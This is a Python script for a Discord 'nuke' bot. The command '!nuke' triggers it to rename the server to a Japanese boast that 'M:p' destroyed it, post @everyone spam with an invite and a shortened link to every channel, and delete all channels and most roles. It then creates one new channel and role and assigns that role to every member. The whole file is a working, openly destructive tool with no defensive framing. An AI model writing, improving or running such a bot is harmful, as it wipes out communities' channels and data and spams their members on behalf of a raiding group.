import asyncio
import aiohttp
import discord
import logging

TOKEN = ""

NEW_SERVER_NAME = "M:p植民地"
ROLE_NAME = "Mp万歳 gg5ch"
ROLE_COLOR = 15548997
CHANNEL_NAME = "gg5ch-このサーバーはmpにより破壊された"

SPAM_MESSAGE = """
@everyone 
# M:p万歳
## このサーバーはM:pにより破壊されました:joy: 
## らぷろむ主席万歳     ぱすた万歳
discord.gg/5ch
https://x.gd/SVod3
"""

FINISH_MESSAGE = "discord.gg/5ch"

logging.getLogger('discord').setLevel(logging.CRITICAL)

intents = discord.Intents.all()
client = discord.Client(intents=intents)

API_BASE = "https://discord.com/api/v10"


def make_headers(token):
    return {
        "Authorization": f"Bot {token}",
        "Content-Type": "application/json",
    }


async def delete_all_channels(session, headers, channel_ids):
    tasks = [session.delete(f"{API_BASE}/channels/{cid}", headers=headers) for cid in channel_ids]
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)


async def delete_all_roles(session, headers, guild_id, role_ids):
    tasks = [session.delete(f"{API_BASE}/guilds/{guild_id}/roles/{rid}", headers=headers) for rid in role_ids]
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)


async def spam_all_channels(session, headers, channel_ids, content):
    tasks = [session.post(f"{API_BASE}/channels/{cid}/messages", json={"content": content}, headers=headers) for cid in channel_ids]
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)


async def create_role(session, headers, guild_id, name, color):
    payload = {
        "name": name,
        "permissions": "0",
        "color": color,
        "hoist": True,
    }
    async with session.post(f"{API_BASE}/guilds/{guild_id}/roles", json=payload, headers=headers) as resp:
        if resp.status == 200:
            data = await resp.json()
            return data.get("id")
        return None


async def create_channel(session, headers, guild_id, name):
    payload = {
        "name": name,
        "type": 0,
    }
    async with session.post(f"{API_BASE}/guilds/{guild_id}/channels", json=payload, headers=headers) as resp:
        if resp.status in (200, 201):
            data = await resp.json()
            return data.get("id")
        return None


async def assign_role_to_all(session, headers, guild_id, role_id, member_ids):
    tasks = [
        session.put(f"{API_BASE}/guilds/{guild_id}/members/{mid}/roles/{role_id}", headers=headers)
        for mid in member_ids
    ]
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)


async def send_message(session, headers, channel_id, content):
    await session.post(f"{API_BASE}/channels/{channel_id}/messages", json={"content": content}, headers=headers)


async def change_server_name(session, headers, guild_id, name):
    await session.patch(f"{API_BASE}/guilds/{guild_id}", json={"name": name}, headers=headers)


async def do_nuke(guild):
    guild_id = guild.id
    token = TOKEN
    headers = make_headers(token)

    ch_ids = [ch.id for ch in guild.channels]
    txt_ids = [ch.id for ch in guild.text_channels if ch.permissions_for(guild.me).send_messages]
    role_ids = [r.id for r in guild.roles if r.id != guild_id and not r.managed and r < guild.me.top_role]
    m_ids = [m.id for m in guild.members if not m.bot]

    async with aiohttp.ClientSession() as session:
        phase1_tasks = []

        if NEW_SERVER_NAME:
            phase1_tasks.append(change_server_name(session, headers, guild_id, NEW_SERVER_NAME))

        if txt_ids and SPAM_MESSAGE:
            phase1_tasks.append(spam_all_channels(session, headers, txt_ids, SPAM_MESSAGE))

        if role_ids:
            phase1_tasks.append(delete_all_roles(session, headers, guild_id, role_ids))

        if ch_ids:
            phase1_tasks.append(delete_all_channels(session, headers, ch_ids))

        await asyncio.gather(*phase1_tasks, return_exceptions=True)

        new_role_id = None
        new_channel_id = None

        role_task = create_role(session, headers, guild_id, ROLE_NAME, ROLE_COLOR) if ROLE_NAME else None
        channel_task = create_channel(session, headers, guild_id, CHANNEL_NAME) if CHANNEL_NAME else None

        results = await asyncio.gather(
            role_task or asyncio.sleep(0),
            channel_task or asyncio.sleep(0),
            return_exceptions=True
        )

        if ROLE_NAME and isinstance(results[0], str):
            new_role_id = results[0]
        if CHANNEL_NAME and isinstance(results[1], str):
            new_channel_id = results[1]

        phase3_tasks = []

        if new_role_id and m_ids:
            phase3_tasks.append(assign_role_to_all(session, headers, guild_id, new_role_id, m_ids))

        if new_channel_id and FINISH_MESSAGE:
            phase3_tasks.append(send_message(session, headers, new_channel_id, FINISH_MESSAGE))

        if phase3_tasks:
            await asyncio.gather(*phase3_tasks, return_exceptions=True)


@client.event
async def on_ready():
    pass


@client.event
async def on_message(message):
    if message.author.bot:
        return

    if message.content.strip() == "!nuke":
        if message.guild is None:
            return

        perms = message.author.guild_permissions
        if not perms or not perms.administrator:
            return

        try:
            await message.delete()
        except:
            pass

        await do_nuke(message.guild)


client.run(TOKEN)
